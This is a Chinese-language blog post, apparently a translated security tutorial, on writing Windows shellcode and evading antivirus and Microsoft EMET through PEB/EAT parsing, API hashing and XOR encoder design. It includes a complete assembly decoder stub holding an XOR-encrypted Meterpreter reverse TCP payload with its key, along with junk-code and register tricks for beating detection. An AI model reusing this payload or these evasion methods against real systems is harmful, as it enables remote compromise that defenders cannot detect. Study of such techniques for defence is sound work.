@@ -1,0 +1,416 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>反检测的艺术3-shellcode的魔力 （翻译） | Lyon&#39;s blog</title>
+  <meta name="author" content="Lyon">
+  
+  <meta name="description" content="Walk steps step by step">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="反检测的艺术3-shellcode的魔力 （翻译）"/>
+  <meta property="og:site_name" content="Lyon&#39;s blog"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  #<link href="/favicon.ico" rel="icon">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <link rel="alternate" href="/atom.xml" title="Lyon&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <script src="/js/jquery.min.js"></script>
+  <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?1d807422614f63c8de98cdc3b546860c";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        }
+        else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+    
+  <script data-ad-client="ca-pub-6317609007693835" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+</head>
+
+
+<body>
+  <!--[if lte IE 8]> <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'> <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode"><img src="http://storage.ie6countdown.com/assets/100/images/banners/warning_bar_0027_Simplified Chinese.jpg" border="0" height="42" width="820" alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today." style='margin-left:auto;margin-right:auto;display: block;'/></a></div> <![endif]-->
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">Lyon&#39;s blog</a></h1>
+  <h2><a href="/">I hear and I forget.I see and I remember.I do and I understand.</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">首页</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+	<li> <a href="/atom.xml">RSS</a> </li>
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header>
+      
+        <time datetime="2020-09-10T11:39:22.000Z"><a href="/2020/09/10/Cybersecurity/art-of-anti-detection-3-art-of-anti-detection-3-shellcode-alchemy/">2020-09-10</a></time>
+      
+      
+  
+    <h1 class="title">反检测的艺术3-shellcode的魔力 （翻译）</h1>
+  
+
+    </header>
+	
+<!-- Table of Contents -->
+
+  <div id="toc" class="toc-article">
+  <strong class="toc-title">文章目录</strong>
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00_相关术语"><span class="toc-number">1.</span> <span class="toc-text">0x00 相关术语</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#进程环境块（PEB）"><span class="toc-number">1.1.</span> <span class="toc-text">进程环境块（PEB）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#导入表（IAT）"><span class="toc-number">1.2.</span> <span class="toc-text">导入表（IAT）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据执行保护（DEP）"><span class="toc-number">1.3.</span> <span class="toc-text">数据执行保护（DEP）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#地址布局随机化（ASLR）"><span class="toc-number">1.4.</span> <span class="toc-text">地址布局随机化（ASLR）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stdcall调用约定"><span class="toc-number">1.5.</span> <span class="toc-text">stdcall调用约定</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01_相关介绍"><span class="toc-number">2.</span> <span class="toc-text">0x01 相关介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02_shellcode编写基础"><span class="toc-number">3.</span> <span class="toc-text">0x02 shellcode编写基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03_解决地址问题"><span class="toc-number">4.</span> <span class="toc-text">0x03 解决地址问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06_对抗漏洞缓解方案"><span class="toc-number">5.</span> <span class="toc-text">0x06 对抗漏洞缓解方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07_绕过EMET"><span class="toc-number">6.</span> <span class="toc-text">0x07 绕过EMET</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
+  </div>
+
+
+	
+    <div class="entry">
+      
+        <p> 本文将讨论编写shellcode的基础知识和相关改变，包含汇编级别的编码器/解码器设计以及几种绕过漏洞缓解方案的方法，如微软的增强缓解应急工具包（Microsoft’s Enhanced Mitigation Experience Toolkit，EMET）。为了理解本文的内容，读者需要至少具有一定的x86汇编方面的基础，并对COFF和PE等基本文件格式有相当的了解，也可以读之前的文章<a href="http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/">反检测的艺术1-反病毒软件及检测技术概述</a>、<a href="http://www.youngroe.com/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/">反检测的艺术2-如何制作PE文件后门</a>理解反病毒软件使用的基本检测技术的内部工作原理和相关术语。<br><a id="more"></a></p>
+<h2 id="0x00_相关术语">0x00 相关术语</h2><h3 id="进程环境块（PEB）">进程环境块（PEB）</h3><p>在计算机中进程环境块（缩写为PEB）是Windows NT操作系统中的一种数据结构。它是操作系统内部使用的不透明数据结构，其中大多数字段除操作系统外均不供其他人使用。微软在其MSDN库文档（仅记录了一些字段）中指出，该结构可能会在Windows的未来版本中更改。PEB包含涉及整个进程很多阐述，包括全局上下文，启动参数，程序映像加载器的数据结构，程序映像基址以及用于为进程范围的数据结构提供互斥的同步对象。</p>
+<h3 id="导入表（IAT）">导入表（IAT）</h3><p>导入表是一种用于查找地址的表，用于程序调用其他模块中的函数时查找地址。它可以采用按序号导入和按名称导入两种形式。由于已编译的程序无法知道其依赖的库的存储位置，因此，每当进行API调用时，都需要进行间接跳转。当动态链接器加载模块并将它们连接在一起时，它会将实际地址写入IAT插槽，以便它们指向相应库函数的所在的内存位置。</p>
+<h3 id="数据执行保护（DEP）">数据执行保护（DEP）</h3><p>数据执行保护（DEP）是一组硬件和软件技术，可对内存执行安全检查，以帮助防止恶意代码在系统上运行。在Microsoft Windows XP Service Pack 2（SP2）和Microsoft Windows XP Tablet PC Edition 2005中，DEP由硬件和软件强制执行。DEP的主要好处是可以帮助防止从数据页执行代码。通常，不会从默认堆和栈中执行代码。硬件强制的DEP检测从这些位置运行的代码，并在执行时引发异常。软件强制的DEP可以帮助防止恶意代码利用Windows中的异常处理机制。</p>
+<h3 id="地址布局随机化（ASLR）">地址布局随机化（ASLR）</h3><p>地址空间布局随机化（ASLR）是一种有关防止缓冲区溢出攻击的计算机安全技术。为了防止攻击者可靠地跳转到内存中的某个特定漏洞位置利用功能，ASLR随机排列进程的关键数据区域的地址空间位置，包括可执行文件的基地址以及栈、堆和依赖库地址。</p>
+<h3 id="stdcall调用约定">stdcall调用约定</h3><p>stdcall调用约定是Pascal调用约定的一种变体，在该约定中，被调用方负责清理栈，但参数按照_cdecl调用约定的顺序从右到左入栈。寄存器EAX，ECX和EDX被指定在函数内使用。返回值存储在EAX寄存器中。 stdcall是Microsoft Win32 API和Open Watcom C ++的标准调用约定。</p>
+<h2 id="0x01_相关介绍">0x01 相关介绍</h2><p>Shellcode在网络安全领域中扮演着非常重要的角色，它被广泛用于许多恶意软件和漏洞利用中。那么，什么是shellcode？ Shellcode是一串数据，将被解释为CPU上的指令，编写Shellcode的主要目的是利用漏洞，该漏洞允许在系统上执行任意代码（例如溢出漏洞），因为Shellcode可以直接在内存内运行，大量恶意代码都利用它。名称shellcode的原因是一般shellcode在执行时会返回命令shell。但随着时间的推移，含义已经演变，如今几乎所有编译器生成的程序都可以转换为shellcode，因为编写shellcode涉及深入了解目标体系结构和操作系统的汇编语言后，本文将假定读者知道如何在Windows和Linux环境下以汇编形式编写程序。互联网上有很多开源的shellcode，但是为了利用新的漏洞和不同的漏洞，每个网络安全研究人员都应该能够编写自己的复杂shellcode，并且编写自己的shellcode有助于理解操作的关键概念。本文的目的是解释基本的shellcode概念，展示降低shellcode的检测率并绕过某些漏洞缓解措施的方法。</p>
+<h2 id="0x02_shellcode编写基础">0x02 shellcode编写基础</h2><p>为不同的操作系统编写shellcode要使用不同的方法，与Windows不同，基于UNIX的操作系统提供了一种通过int 0x80接口与内核进行通信的直接方法，基于UNIX的操作系统内部的所有syscall都有一个唯一的编号，即调用0x80中断代码（int 0x80），内核使用给定的编号和参数执行syscall，但这是问题所在，Windows没有直接的内核接口，这意味着必须有指向函数的具体指针（内存地址）才能调用它们，不幸的是，对功能地址进行硬编码并不能完全解决问题，Windows内部的每个功能地址在每个Service Pack，版本甚至配置中都会发生变化，使用硬编码地址使Shellcode高度依赖版本，在Windows上编写与版本无关的Shellcode可以解决寻址问题可能会贯穿整个解决地址问题，这可以通过在运行时动态查找函数地址来实现。</p>
+<h2 id="0x03_解决地址问题">0x03 解决地址问题</h2><p>在整个过程中，shellcode编写者一直在寻找在运行时查找Windows API函数地址的巧妙方法，在本文中，我们将重点介绍一种称为PEB解析的方法，该方法使用Process Environment Block（PEB）数据结构来查找基地址。在分析已加载的DLL并通过分析导出表（EAT）来找到其函数地址时，metasploit框架内的几乎所有版本无关的Windows shellcode都使用此技术来查找Windows API函数的地址，这种方法利用了在Windows中，可以通过FS段寄存器找到线程环境块（TEB）地址，当执行Shellcode时，TEB块包含很多有用的数据，包括我们正在寻找的PEB结构在内存中，我们需要从TEB块的向后48个字节，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">mov edx, [fs:eax+<span class="number">48</span>]</span><br></pre></td></tr></table></figure></p>
+<p>现在我们有一个指向PEB结构的指针，</p>
+<div align="center"><br><img src="/img/anti_av3_TEB.png" align><br></div>
+
+<p>获取PEB结构指针之后，现在我们将从PEB块的开头开始向后移动12个字节，以获取PEB块内部的Ldr数据结构指针的地址，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx+<span class="number">12</span>]</span><br></pre></td></tr></table></figure>
+<div align="center"><br><img src="/img/anti_av3_PEB.png" align><br></div>
+
+<p>Ldr结构包含有关该进程已加载模块的信息，如果我们在Ldr结构内再移20个字节，我们将到达InMemoryOrderModuleList中的第一个模块，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx+<span class="number">20</span>]</span><br></pre></td></tr></table></figure></p>
+<div align="center"><br><img src="/img/anti_av3_Ldr.png" align><br></div>
+
+<p>现在，我们的指针指向InMemoryOrderModuleList，这是一个LIST_ENTRY结构，Windows将该结构定义为包含该进程已加载模块的双向链接列表的头部。列表中的每个项目都是一个指向LDR_DATA_TABLE_ENTRY结构的指针，该结构是我们的主要目标，它包含已加载DLL（模块）的全名和基址，由于已加载模块的顺序可以更改，因此我们应检查全名为了找到包含我们要查找函数的正确的DLL，可以轻松地做到这一点，只要DLL名称与我们要查找的名称相匹配，则从LDR_DATA_TABLE_ENTRY的开头向后移40个字节，我们可以继续进行，通过在LDR_DATA_TABLE_ENTRY内部向前移动16个字节，我们现在终于有了加载的DLL的基址，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx+<span class="number">16</span>]</span><br></pre></td></tr></table></figure>
+<div align="center"><br><img src="/img/anti_av3_LDR_DATA_TABLE_ENTRY.png" align><br></div><br>获取函数地址的第一步已经完成，现在我们有了包含所需函数的DLL的基址，我们必须解析DLL的导出表才能找到所需的函数地址，导出表位于在PE可选头中，从基地址向后移动60个字节，我们现在有了一个指向DLL在内存中的PE可选头的指针，<br><div align="center"><br><img src="/img/anti_av3_PE_On_Memory.gif" align><br></div>
+
+<p>最后我们需要使用（模块基地址+ PE头地址+ 120字节）公式计算导出表的地址，这将给出导出表的地址（EAT），获得EAT地址后，我们现在可以访问对于DLL导出的所有功能，Microsoft下图描述了IMAGE_EXPORT_DIRECTORY，</p>
+<div align="center"><br><img src="/img/anti_av3_Image_Export_Directory.gif" align><br></div><br>该结构包含导出函数的地址，名称和数量，使用同大小计算方式可以遍历函数地址，可以在此结构内获得所需的函数地址，当然，由于每个Windows版本，导出函数的顺序可能会有所不同在获取函数地址之前，应先检查函数名称，在确定函数名称之后，现在就可以找到函数地址，因此您可以理解，此方法仅涉及计算多个Windows数据结构的大小，并且遍历内存内部，这里真正的挑战是建立一个可靠的名称比较机制来选择正确的DLL和功能，似乎PEB解析技术很难实现，请不要担心，有更简单的方法可以做到这一点。<br><br>## 0x04 API哈希<br><br><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external">metasploit</a>项目中的几乎所有shellcode都使用一个称为<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" target="_blank" rel="external">Hash API</a>的汇编块，这是Stephen Fewer编写的一小段代码，自2009年以来，在metasploit中大多数Windows版本shellcode都使用了这个汇编文块，该汇编块使解析PEB结构变得更加容易，它使用基本的PEB解析逻辑和一些其他哈希方法来通过计算函数和模块名称的ROR13哈希来快速查找所需的函数。此块的用法非常简单，它使用stdcall调用约定，唯一的区别在于传送的函数参数，它需要函数名和包含该函数的DLL名称的ROR13哈希，传送必需的参数和函数哈希之后，它如前所述解析了PEB块，并在找到模块名后找到了模块名它计算ROR13哈希并将其保存到栈中，然后移至DLL的导出地址表，并计算每个函数名的ROR13哈希，它获取每个函数名称哈希值和模块名称哈希值的总和，如果总和与我们正在寻找的哈希值匹配，则意味着找到了所需的函数，最后，Hash API使用以下命令跳转到找到的函数地址在堆栈上传递的参数，这是一段非常优雅的代码，但由于它的流行和广泛使用，它已经到了最后的日子，某些反病毒产品和漏洞缓解措施专门针对此代码块的工作逻辑，甚至某些视反病毒产品对使用Hash API所使用的ROR13哈希作为识别恶意文件的签名，由于操作系统内部反漏洞解决方案的最新进展，Hash API的寿命很短，但是还有其他找到Windows的方法API函数地址，同时使用编码方法，此方法仍可以绕过大多数反病毒产品。<br><br>## 0x05 编码器/解码器设计<br><br>在开始涉及之前，读者需要知道的是单独使用编码器并不能生成完全不可检测的shellcode，在执行shellcode后解码器将直接解码整个shellcode为其原始形式，这不能绕过反病毒产品的动态分析机制。<br>解码器逻辑很简单，它将使用一个随机生成的多字节XOR密钥对shellcode进行解码，在执行解码操作后它将执行它，在将shellcode放入解码器头之前，应使用多字节XOR密钥对shellcode进行加密，并且应将shellcode和XOR密钥分别放置在<shellcode>、<key>标签内，<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;&#9;#===============================#&#10;;&#9;|ESI -&#62; Pointer to shellcode    |&#10;;&#9;|EDI -&#62; Pointer to key          |&#10;;&#9;|ECX -&#62; Shellcode index counter |&#10;;&#9;|EDX -&#62; Key index counter       |&#10;;&#9;|AL  -&#62; Shellcode byte holder   |&#10;;&#9;|BL  -&#62; Key byte holder         |&#10;;&#9;#===============================#&#10;;&#10;[BITS 32]&#10;[ORG 0]&#10;&#10; JMP GetShellcode         ; Jump to shellcode label&#10;Stub: &#10; POP ESI                  ; Pop out the address of shellcode to ESI register &#10; PUSH ESI                 ; Save the shellcode address to stack &#10; XOR ECX,ECX              ; Zero out the ECX register&#10;GetKey: &#10; CALL SetKey              ; Call the SetKey label&#10; Key: DB &#60;Key&#62;            ; Decipher key&#10; KeyEnd: EQU $-Key        ; Set the size of the decipher key to KeyEnd label&#10;SetKey:&#10; POP EDI                  ; Pop the address of decipher key to EDI register&#10; XOR EDX,EDX              ; Zero out the EDX register&#10;Decipher: &#10; MOV AL,[ESI]             ; Move 1 byte from shellcode to AL register&#10; MOV BL,[EDI]             ; Move 1 byte from decipher key to BL register&#10; XOR AL,BL                ; Make a logical XOR operation between AL ^ BL&#10; MOV [ESI],AL             ; Move back the deciphered shellcode byte to same index&#10; INC ESI                  ; Increase the shellcode index&#10; INC EDI                  ; Increase the key index&#10; INC ECX                  ; Increase the shellcode index counter&#10; INC EDX                  ; Increase the key index counter&#10; CMP ECX, End             ; Compare the shellcode index counter with shellcode size &#10; JE Fin                   ; If index counter is equal to shellcode size, jump to Fin label&#10; CMP EDX,KeyEnd           ; Compare the key index counter with key size &#10; JE GetKey                ; If key index counter is equal to key size, jump to GetKey label for reseting the key&#10; JMP Decipher             ; Repeate all operations&#10;Fin:                      ; In here deciphering operation is finished&#10; RET                      ; Execute the shellcode&#10;GetShellcode:&#10; CALL Stub                ; Jump to Stub label and push the address of shellcode to stack&#10; Shellcode: DB &#60;Shellcode&#62;&#10;&#10; End: EQU $-Shellcode     ; Set the shellcode size to End label</span><br></pre></td></tr></table></figure><br><br>由于代码几乎是自解释的，因此我不会浪费时间逐行解释它，使用JMP / CALL技巧可以在运行时获取shellcode和密钥的地址，然后使用shellcode的每个字节与密钥的每个字节做xor运算，每次解密密钥到达结尾时，它将重头开始使用密钥，完成解码操作后，它将跳转到shellcode，使用更长的XOR密钥会增加shellcode的随机性，还会增加代码块的熵，因此避免使用太长的解密密钥，有数百种方法使用基本逻辑运算（例如XOR，NOT，ADD，SUB，ROR，ROL）对shellcode进行编码，在每个编码器例程中都有无限可能的shellcode输出，可能反病毒产品在解码shellcode之前检测外壳代码的签名非常低，因为某些反病毒产品还开发了启发式引擎，能够检测代码块内的解密和解码循环。在编写shellcode编码器时，这里还有几种方法可以绕过针对shellcode编码器的静态检测，<br><br>### 不常见的寄存器用法<br><br>在x86体系结构中，所有寄存器都有特定的用途，例如ECX代表扩展计数器寄存器，它通常用作循环计数器，当我们以任何编译语言编写基本循环条件时，编译器可能会使用ECX寄存器作为循环计数器。循环计数器变量，启发式引擎在代码块中找到连续增加的ECX寄存器强烈表明存在循环，此问题的解决方案很简单，不将ECX寄存器用于循环计数器，这只是一个示例，但它也非常对于所有其他类型的代码片段（如函数结尾/序言等）有效。很多代码识别机制取决于寄存器使用情况，用非常用的寄存器使用方式编写汇编代码会降低检测率。<br><br>### 垃圾代码填充<br><br>可能有数百种方法来识别代码块内的解码器，并且几乎每个反病毒产品都使用不同的方法，但是最终它们必须生成一个签名。在解码器代码内随机使用NOP指令是一个很好的方法绕过基于签名的静态检测，也可以使用其他任何不影响程序原始功能的指令指令替代NOP指令，其目的是添加垃圾指令以分解代码块内的恶意签名，另一个编写shellcode的重要之处在于大小，因此请避免在解码器内部使用过多的垃圾混淆代码，否则会增加整体大小。<br>实施此方法后，结果代码如下所示：<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;&#9;#==============================#&#10;;&#9;|ESI -&#62; Pointer to shellcode   |&#10;;&#9;|EDI -&#62; Pointer to key         |&#10;;&#9;|EAX -&#62; Shellcode index counter|&#10;;&#9;|EDX -&#62; Key index counter      |&#10;;&#9;|CL  -&#62; Shellcode byte holder  |&#10;;&#9;|BL  -&#62; Key byte holder        |&#10;;&#9;#==============================#&#10;;&#10;&#10;[BITS 32]&#10;[ORG 0]&#10;&#10;    JMP GetShellcode                ; Jump to shellcode label&#10;Stub:       &#10;    POP ESI                         ; Pop out the address of shellcode to ESI register        &#10;    PUSH ESI                        ; Save the shellcode address to stack &#10;    XOR EAX,EAX                     ; Zero out the EAX register&#10;GetKey:     &#10;    CALL SetKey                     ; Call the SetKey label&#10;    Key: DB 0x78, 0x9b, 0xc5, 0xb9, 0x7f, 0x77, 0x39, 0x5c, 0x4f, 0xa6                 ; Decipher key&#10;    KeyEnd: EQU $-Key               ; Set the size of the decipher key to KeyEnd label&#10;SetKey:&#10;    POP EDI                         ; Pop the address of decipher key to EDI register&#10;    NOP                             ; [GARBAGE]&#10;    XOR EDX,EDX                     ; Zero out the EDX register&#10;    NOP                             ; [GARBAGE]&#10;Decipher:       &#10;    NOP                             ; [GARBAGE]&#10;    MOV CL,[ESI]                    ; Move 1 byte from shellcode to CL register&#10;    NOP                             ; [GARBAGE]&#10;    NOP                             ; [GARBAGE]&#10;    MOV BL,[EDI]                    ; Move 1 byte from decipher key to BL register&#10;    NOP                             ; [GARBAGE]&#10;    XOR CL,BL                       ; Make a logical XOR operation between CL ^ BL&#10;    NOP                             ; [GARBAGE]&#10;    NOP                             ; [GARBAGE]&#10;    MOV [ESI],CL                    ; Move back the deciphered shellcode byte to same index&#10;    NOP                             ; [GARBAGE]&#10;    NOP                             ; [GARBAGE]&#10;    INC ESI                         ; Increase the shellcode index&#10;    INC EDI                         ; Increase the key index&#10;    INC EAX                         ; Increase the shellcode index counter&#10;    INC EDX                         ; Increase the key index counter&#10;    CMP EAX, End                    ; Compare the shellcode index counter with shellcode size &#10;    JE Fin                          ; If index counter is equal to shellcode size, jump to Fin label&#10;    CMP EDX,KeyEnd                  ; Compare the key index counter with key size &#10;    JE GetKey                       ; If key index counter is equal to key size, jump to GetKey label for reseting the key&#10;    JMP Decipher                    ; Repeate all operations&#10;Fin: ; In here deciphering operation is finished&#10;    RET                             ; Execute the shellcode&#10;GetShellcode:&#10;    CALL Stub                       ; Jump to Stub label and push the address of shellcode to stack&#10;    Shellcode: DB  0x84, 0x73, 0x47, 0xb9, 0x7f, 0x77, 0x59, 0xd5, 0xaa, 0x97, 0xb8, 0xff,&#10;  0x4e, 0xe9, 0x4f, 0xfc, 0x6b, 0x50, 0xc4, 0xf4, 0x6c, 0x10, 0xb7, 0x91,&#10;  0x70, 0xc0, 0x73, 0x7a, 0x7e, 0x59, 0xd4, 0xa7, 0xa4, 0xc5, 0x7d, 0x5b,&#10;  0x19, 0x9d, 0x80, 0xab, 0x79, 0x5c, 0x27, 0x4b, 0x2d, 0x20, 0xb2, 0x0e,&#10;  0x5f, 0x2d, 0x32, 0xa7, 0x4e, 0xf5, 0x6e, 0x0f, 0xda, 0x14, 0x4e, 0x77,&#10;  0x29, 0x10, 0x9c, 0x99, 0x7e, 0xa4, 0xb2, 0x15, 0x57, 0x45, 0x42, 0xd2,&#10;  0x4e, 0x8d, 0xf4, 0x76, 0xef, 0x6d, 0xb0, 0x0a, 0xb9, 0x54, 0xc8, 0xb8,&#10;  0xb8, 0x4f, 0xd9, 0x29, 0xb9, 0xa5, 0x05, 0x63, 0xfe, 0xc4, 0x5b, 0x02,&#10;  0xdd, 0x04, 0xc4, 0xfe, 0x5c, 0x9a, 0x16, 0xdf, 0xf4, 0x7b, 0x72, 0xd7,&#10;  0x17, 0xba, 0x79, 0x48, 0x4e, 0xbd, 0xf4, 0x76, 0xe9, 0xd5, 0x0b, 0x82,&#10;  0x5c, 0xc0, 0x9e, 0xd8, 0x26, 0x2d, 0x68, 0xa3, 0xaf, 0xf9, 0x27, 0xc1,&#10;  0x4e, 0xab, 0x94, 0xfa, 0x64, 0x34, 0x7c, 0x94, 0x78, 0x9b, 0xad, 0xce,&#10;  0x0c, 0x45, 0x66, 0x08, 0x27, 0xea, 0x0f, 0xbd, 0xc2, 0x46, 0xaa, 0xcf,&#10;  0xa9, 0x5d, 0x4f, 0xa6, 0x51, 0x5f, 0x91, 0xe9, 0x17, 0x5e, 0xb9, 0x37,&#10;  0x4f, 0x59, 0xad, 0xf1, 0xc0, 0xd1, 0xbf, 0xdf, 0x3b, 0x47, 0x27, 0xa4,&#10;  0x78, 0x8a, 0x99, 0x30, 0x99, 0x27, 0x69, 0x0c, 0x1f, 0xe6, 0x28, 0xdb,&#10;  0x95, 0xd1, 0x95, 0x78, 0xe6, 0xbc, 0xb0, 0x73, 0xef, 0xf1, 0xd5, 0xef,&#10;  0x28, 0x1f, 0xa0, 0xf9, 0x3b, 0xc7, 0x87, 0x4e, 0x40, 0x79, 0x0b, 0x7b,&#10;  0xc6, 0x12, 0x47, 0xd3, 0x94, 0xf3, 0x35, 0x0c, 0xdd, 0x21, 0xc6, 0x89,&#10;  0x25, 0xa6, 0x12, 0x9f, 0x93, 0xee, 0x17, 0x75, 0xe0, 0x94, 0x10, 0x59,&#10;  0xad, 0x10, 0xf3, 0xd3, 0x3f, 0x1f, 0x39, 0x4c, 0x4f, 0xa6, 0x2e, 0xf1,&#10;  0xc5, 0xd1, 0x27, 0xd3, 0x6a, 0xb9, 0xb0, 0x73, 0xeb, 0xc8, 0xaf, 0xb9,&#10;  0x29, 0x24, 0x6e, 0x34, 0x4d, 0x7f, 0xb0, 0xc4, 0x3a, 0x6c, 0x7e, 0xb4,&#10;  0x10, 0x9a, 0x3a, 0x48, 0xbb&#10;&#10;&#10;    End: EQU $-Shellcode            ; Set the shellcode size to End label</span><br></pre></td></tr></table></figure><br><br>唯一的变化是EAX和ECX寄存器之间的变化，现在负责计算shellcode索引的寄存器是EAX，并且每条XOR和MOV指令之间只有几行NOP填充，本教程使用的shellcode是Windowsmeterpreter反向TCP，经过加密带有10字节长的随机XOR密钥的shellcode都放置在解码器中，使用nasm -f bin Decoder.asm命令将解码器组装为二进制格式（不要忘记删除shellcode上的换行符否则nasm会编译失败）。<br>这是对原始Shellcode进行编码之前的反病毒扫描结果，<br><br><div align="center"><br><img src="/img/anti_av3_Shellcode.png" align><br></div>
+
+<p>如您所见，许多反病毒软件都可以识别Shellcode。这是经过编码的shellcode的结果，</p>
+<div align="center"><br><img src="/img/anti_av3_EncodedShellcode.png" align><br></div>
+
+<h2 id="0x06_对抗漏洞缓解方案">0x06 对抗漏洞缓解方案</h2><p>当绕过反病毒软件时，有很多成功的方法，但是漏洞​​利用缓解将情况提升到一个全新的水平，微软在2009年发布了<a href="https://support.microsoft.com/en-us/help/2458544/the-enhanced-mitigation-experience-toolkit" target="_blank" rel="external">增强缓解体验工具包（EMET）</a>，它是一种有助于防止漏洞利用的实用程序。在成功开发软件方面，它具有多种保护机制，</p>
+<ul>
+<li>动态数据执行保护（DEP）</li>
+<li>结构异常处理程序覆盖保护（SEHOP）</li>
+<li>空页分配</li>
+<li>堆喷防护</li>
+<li>导出地址表地址过滤（EAF）</li>
+<li>强制性ASLR</li>
+<li>导出地址表访问过滤增强版（EAF +）</li>
+<li>缓解ROP<ul>
+<li>加载库检查</li>
+<li>内存保护检查</li>
+<li>调用方检查</li>
+<li>模拟执行流程</li>
+<li>Stack pivot</li>
+</ul>
+</li>
+<li>减少攻击面（ASR）</li>
+</ul>
+<p>在这些缓解措施中，EAF，EAF +和调用方检查是我们最关注的问题，如前所述，metasploit框架中的几乎所有shellcode都使用Stephen Fewer的Hash API，并且由于Hash API应用了PEB/EAT解析技术，因此EMET可以轻松检测并阻止执行shellcode。</p>
+<h2 id="0x07_绕过EMET">0x07 绕过EMET</h2><p>调用方检查EMET内部以检查由进程进行的Windows API调用，它阻止Win API函数中的RET和JMP指令，以防止在找到所需的Win API之后在Hash API中使用所有使用面向返回的编程（ROP）方法的漏洞利用函数地址使用JMP指令执行函数，不幸的是这将触发EMET调用者检查，为了绕过调用者检查，应避免使用指向Win API函数的JMP和RET指令，而应替换用于执行的JMP指令带有CALL的Win API函数，Hash API应该通过调用方检查，但是当我们查看EAF、EAF+缓解技术时，它们会阻止访问导出地址表（EAT）进行读/写访问，具体取决于所调用的代码，并检查栈寄存器是否在允许的范围内，并尝试检测对某些DLL如KERNELBASE的MZ/PE头的访问，这是一种用于防止EAT解析技术的非常有效的缓解方法，但是EAT并不是唯一包含所需函数地址的结构，如果应用程序使用了，则导入地址表（IAT）还将保存应用程序使用的Win API函数地址还在使用所需的功能时，可以在IAT结构中收集功能地址，一位名叫Joshua Pitts的网络安全研究人员最近开发了一种新的IAT解析方法，它在导入地址表中找到了LoadLibraryA和GetProcAddress Windows API函数，在获取这些函数地址后，可以从任何库中提取任何函数，他还编写了一个名为fido的工具，用于剥离Stephen Fewer的Hash API并替换为他编写的IAT解析代码，如果您想在阅读有关此方法的更多信息请点击<a href="https://github.com/secretsquirrel/fido/blob/master/REconBR_2017.pdf" target="_blank" rel="external">这</a>.</p>
+<h2 id="参考">参考</h2><ul>
+<li><a href="https://msdn.microsoft.com/en-us/library/ms809762.aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ms809762.aspx</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Process_Environment_Block" target="_blank" rel="external">https://en.wikipedia.org/wiki/Process_Environment_Block</a></li>
